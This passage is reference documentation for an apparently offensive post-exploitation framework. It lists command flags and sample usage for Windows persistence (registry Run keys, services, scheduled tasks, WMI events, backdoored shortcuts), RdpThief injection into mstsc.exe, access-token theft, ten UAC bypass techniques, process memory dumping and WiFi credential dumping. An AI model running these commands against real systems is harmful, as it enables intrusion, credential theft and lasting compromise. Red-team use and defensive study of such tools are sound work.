* [persistence startup_folder](#persistence-startup_folder)	 - persistence via startup folder

#### persistence BackdoorLnk

persistence

```
persistence BackdoorLnk [flags]
```

**Options**

```
      --artifact_name string         artifact name to use as payload (tab-complete supported)
      --command string               The new command to be set for the .lnk file.
      --custom_file string           local file path to use as payload
      --drop_location string         File path where payload is dropped
  -h, --help                         print help
      --lnkpath string               The original path of the .lnk file to be replaced.
  -f, --output_file string           output file
      --use_malefic_as_custom_file   use current session's artifact as payload
      --wizard                       Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

#### persistence Install_Service

persistence

```
persistence Install_Service [flags]
```

**Options**

```
      --account_name string          account of the service (default "LocalSystem")
      --artifact_name string         artifact name to use as payload (tab-complete supported)
      --command string               Command to execute via the registry key
      --custom_file string           local file path to use as payload
      --display_name string          Display Name of the service (default "WinSvc")
      --drop_location string         File path where payload is dropped (default "C:\\Windows\\Temp\\Stay.exe")
      --error_control string         Service error handling (e.g., Ignore, Normal) (default "Ignore")
  -h, --help                         print help
  -f, --output_file string           output file
      --service_name string          service_name (default "WinSvc")
      --start_type string            Type of service startup (default "AutoStart")
      --use_malefic_as_custom_file   use current session's artifact as payload
      --wizard                       Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

#### persistence Junction_Folder

persistence

```
persistence Junction_Folder [flags]
```

**Options**

```
      --artifact_name string         artifact name to use as payload (tab-complete supported)
      --custom_file string           local file path to use as payload
      --dllpath string               dllpath
      --drop_location string         drop_location
      --guid string                  guid
  -h, --help                         print help
  -f, --output_file string           output file
      --use_malefic_as_custom_file   use current session's artifact as payload
      --wizard                       Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

#### persistence NewLnk

persistence

```
persistence NewLnk [flags]
```

**Options**

```
      --artifact_name string         artifact name to use as payload (tab-complete supported)
      --command string               command
      --custom_file string           local file path to use as payload
      --drop_location string         drop_location
      --filepath string              filepath
  -h, --help                         print help
      --lnkicon string               lnkicon
      --lnkname string               lnkname
      --lnktarget string             lnktarget
  -f, --output_file string           output file
      --use_malefic_as_custom_file   use current session's artifact as payload
      --wizard                       Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

#### persistence Registry_Key

persistence via Windows Registry Key

```
persistence Registry_Key [flags]
```

**Options**

```
      --artifact_name string         artifact name to use as payload (tab-complete supported)
      --command string               Command to execute via the registry key
      --custom_file string           local file path to use as payload
      --drop_location string         File path where payload is dropped (default "C:\\Windows\\Temp\\Stay.exe")
  -h, --help                         print help
  -f, --output_file string           output file
      --reg_key_name string          Name of the registry key to create or modify (default "WinReg")
      --registry_key string          Full registry key path (e.g., HKLM\Software\Microsoft\Windows\CurrentVersion\Run) (default "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
      --use_malefic_as_custom_file   use current session's artifact as payload
      --wizard                       Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

#### persistence Scheduled_Task

persistence

```
persistence Scheduled_Task [flags]
```

**Options**

```
      --artifact_name string         artifact name to use as payload (tab-complete supported)
      --command string               Command to execute via the registry key
      --custom_file string           local file path to use as payload
      --drop_location string         File path where payload is dropped (default "C:\\Windows\\Temp\\Stay.exe")
  -h, --help                         print help
  -f, --output_file string           output file
      --taskname string              taskname (default "WinTask")
      --trigger int                  trigger (default 9)
      --use_malefic_as_custom_file   use current session's artifact as payload
      --wizard                       Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

#### persistence WMI_Event

persistence

```
persistence WMI_Event [flags]
```

**Options**

```
      --artifact_name string         artifact name to use as payload (tab-complete supported)
      --attime string                At Time:  (default "startup")
      --command string               Command to execute
      --custom_file string           local file path to use as payload
      --drop_location string         File path where payload is dropped (default "C:\\Windows\\Temp\\Stay.exe")
      --eventname string             eventname (default "WinEvent")
  -h, --help                         print help
  -f, --output_file string           output file
      --use_malefic_as_custom_file   use current session's artifact as payload
      --wizard                       Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

#### persistence reg_key

persistence by reg_key

```
persistence reg_key [flags]
```

**Options**

```
  -h, --help                  print help
  -f, --output_file string    output file
      --reg_key_name string   reg_key (default "Windows_Updater")
      --wizard                Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

#### persistence startup_folder

persistence via startup folder

```
persistence startup_folder [flags]
```

**Options**

```
      --artifact_name string             artifact name to use as payload (tab-complete supported)
      --custom_file string               local file path to use as payload
      --filename string                  filename of executable file to be run at startup. (default "Stay.exe")
  -h, --help                             print help
  -f, --output_file string               output file
      --use_current_user_startupfolder   use_current_user_startupfolder (default true)
      --use_malefic_as_custom_file       use current session's artifact as payload
      --wizard                           Start interactive wizard mode
```

**SEE ALSO**

* [persistence](#persistence)	 - 

### pingscan

Ping scan target <target>

```
pingscan [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --target string        IP or hostname(eg. 10.10.121.100-10.10.121.120,192.168.0.1/24)
      --wizard               Start interactive wizard mode
```

### portscan

Port scan target <target> <ports> [timeout]

```
portscan [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --ports string         ports to scan (e.g., 80,443,8080 or 1-1000)
      --target string        IPv4 ranges and CIDR (eg. 192.168.1.128, 192.168.1.128-192.168.2.240, 192.168.1.0/24)
      --wizard               Start interactive wizard mode
```

### procdump

Dump a process memory

**Description**

**Dump a process memory:**

```
procdump --pid 1234 --output-path C:\Windows\Temp\procdump.dmp
```


```
procdump [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --output_path string   output path for the dump (default "C:\\Windows\\Temp\\procdump.dmp")
      --pid int              process id to dump
      --wizard               Start interactive wizard mode
```

### rdpthief



**SEE ALSO**

* [rdpthief inject](#rdpthief-inject)	 - Manually inject RdpThief into mstsc.exe process <pid>

#### rdpthief inject

Manually inject RdpThief into mstsc.exe process <pid>

**Description**

Manually inject RdpThief DLL into a specific mstsc.exe process.

**Positional format:**

```
rdpthief inject 1234
```

**Flag format:**

```
rdpthief inject --pid 1234
```

**Steps to use:**

1. Find mstsc.exe process: `ps | grep mstsc`
2. Inject into the PID: `rdpthief inject <pid>`
3. Wait for user to enter credentials

> Only supports x64 architecture. Target must be mstsc.exe process. Credentials are logged to %TEMP%\data.bin.


```
rdpthief inject [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --pid int              PID of mstsc.exe process to inject into
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [rdpthief](#rdpthief)	 - 

### readfile

Read file content <filepath>

```
readfile [flags]
```

**Options**

```
      --filepath string      path to the file to read
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### rem_community



**SEE ALSO**

* [rem_community connect](#rem_community-connect)	 - connect to rem
* [rem_community fork](#rem_community-fork)	 - fork rem
* [rem_community load](#rem_community-load)	 - load rem with rem.dll
* [rem_community log](#rem_community-log)	 - get rem log
* [rem_community run](#rem_community-run)	 - run rem
* [rem_community socks5](#rem_community-socks5)	 - serving socks5 with rem
* [rem_community stop](#rem_community-stop)	 - stop rem

#### rem_community connect

connect to rem

```
rem_community connect [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [rem_community](#rem_community)	 - 

#### rem_community fork

fork rem

```
rem_community fork [flags]
```

**Options**

```
  -h, --help                 print help
      --local_url string     local_url
      --mod string           mod
  -f, --output_file string   output file
      --remote_url string    remote_url
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [rem_community](#rem_community)	 - 

#### rem_community load

load rem with rem.dll

```
rem_community load [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [rem_community](#rem_community)	 - 

#### rem_community log

get rem log

```
rem_community log [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [rem_community](#rem_community)	 - 

#### rem_community run

run rem

```
rem_community run [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --pipe string          pipe
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [rem_community](#rem_community)	 - 

#### rem_community socks5

serving socks5 with rem

```
rem_community socks5 [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --pass string          pass
      --port string          port
      --user string          user
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [rem_community](#rem_community)	 - 

#### rem_community stop

stop rem

```
rem_community stop [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [rem_community](#rem_community)	 - 

### route



**SEE ALSO**

* [route print](#route-print)	 - Display routing table

#### route print

Display routing table

```
route print [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [route](#route)	 - 

### screenshot

Command: situational screenshot <filename>

```
screenshot [flags]
```

**Options**

```
      --filename string      filename to save screenshot (default "screenshot.jpg")
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### systeminfo

Display system information

```
systeminfo [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### token



**SEE ALSO**

* [token make](#token-make)	 - Create impersonated token from credentials <username> <password> <domain> [type]
* [token steal](#token-steal)	 - Steal access token from a process <pid>

#### token make

Create impersonated token from credentials <username> <password> <domain> [type]

**Description**

**Create an impersonated token from given credentials:**

```
token make --username admin --password P@ssword --domain domain.local --type 8
token make --username admin --password P@ssword --domain domain.local
```

**Logon types:**

- `2` - Interactive
- `3` - Network
- `4` - Batch
- `5` - Service
- `8` - NetworkCleartext
- `9` - NewCredentials (default)


```
token make [flags]
```

**Options**

```
      --domain string        domain for token creation
  -h, --help                 print help
  -f, --output_file string   output file
      --password string      password for token creation
      --type string          logon type (2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials) (default "9")
      --username string      username for token creation
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [token](#token)	 - 

#### token steal

Steal access token from a process <pid>

**Description**

**Steal access token from a process:**

```
token steal 1234
token steal --pid 1234
```

> Requires appropriate privileges to access target process. Target process must have a valid access token.


```
token steal [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --pid string           process ID to steal token from
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [token](#token)	 - 

### uac-bypass



**SEE ALSO**

* [uac-bypass colordataproxy](#uac-bypass-colordataproxy)	 - UAC bypass using ColorDataProxy technique
* [uac-bypass editionupgrade](#uac-bypass-editionupgrade)	 - UAC bypass using EditionUpgradeManager technique
* [uac-bypass elevatedcom](#uac-bypass-elevatedcom)	 - UAC bypass using CmstpElevatedCOM technique
* [uac-bypass envbypass](#uac-bypass-envbypass)	 - UAC bypass using environment variable manipulation
* [uac-bypass eventvwr](#uac-bypass-eventvwr)	 - UAC bypass using Event Viewer hijack
* [uac-bypass registryshell](#uac-bypass-registryshell)	 - UAC bypass using Registry Shell Command technique
* [uac-bypass silentcleanup](#uac-bypass-silentcleanup)	 - UAC bypass using SilentCleanupWinDir technique
* [uac-bypass sspi](#uac-bypass-sspi)	 - UAC bypass using SSPI technique
* [uac-bypass trustedpath](#uac-bypass-trustedpath)	 - UAC bypass via fake windows directory with ComputerDefaults.exe and Secur32.dll
* [uac-bypass wscript](#uac-bypass-wscript)	 - UAC bypass using WScript hijack

#### uac-bypass colordataproxy

UAC bypass using ColorDataProxy technique

```
uac-bypass colordataproxy [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass editionupgrade

UAC bypass using EditionUpgradeManager technique

```
uac-bypass editionupgrade [flags]
```

**Options**

```
      --command string       Command to execute with elevated privileges
  -h, --help                 print help
  -f, --output_file string   output file
      --use_disk_file        Use on-disk file variant
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass elevatedcom

UAC bypass using CmstpElevatedCOM technique

```
uac-bypass elevatedcom [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass envbypass

UAC bypass using environment variable manipulation

```
uac-bypass envbypass [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass eventvwr

UAC bypass using Event Viewer hijack

```
uac-bypass eventvwr [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass registryshell

UAC bypass using Registry Shell Command technique

```
uac-bypass registryshell [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass silentcleanup

UAC bypass using SilentCleanupWinDir technique

```
uac-bypass silentcleanup [flags]
```

**Options**

```
      --command string       Command to execute with elevated privileges
  -h, --help                 print help
  -f, --output_file string   output file
      --use_disk_file        Use on-disk file variant
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass sspi

UAC bypass using SSPI technique

```
uac-bypass sspi [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass trustedpath

UAC bypass via fake windows directory with ComputerDefaults.exe and Secur32.dll

**Description**

UAC bypass via fake Windows directory with ComputerDefaults.exe and Secur32.dll hijacking.

**Examples:**

```
uac-bypass trustedpath --local_dll_file C:\path\to\your\malicious.dll
```

**Requirements:** x64 architecture only. Valid DLL file for hijacking. Windows 10/11 compatible.


```
uac-bypass trustedpath [flags]
```

**Options**

```
  -h, --help                    print help
      --local_dll_file string   Full path to the DLL file to be executed
  -f, --output_file string      output file
      --wizard                  Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

#### uac-bypass wscript

UAC bypass using WScript hijack

```
uac-bypass wscript [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [uac-bypass](#uac-bypass)	 - 

### wifi



**SEE ALSO**

* [wifi dump](#wifi-dump)	 - Dump WiFi profile credentials <profilename>
* [wifi enum](#wifi-enum)	 - Enumerate WiFi profiles

#### wifi dump

Dump WiFi profile credentials <profilename>

**Description**

**Positional arguments format:**

```
wifi dump "My WiFi Network"
wifi dump MyWiFi
```

**Flag format:**

```
wifi dump --profilename "My WiFi Network"
wifi dump --profilename MyWiFi
```


```
wifi dump [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --profilename string   WiFi profile name to dump
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [wifi](#wifi)	 - 

#### wifi enum

Enumerate WiFi profiles

```
wifi enum [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [wifi](#wifi)	 - 

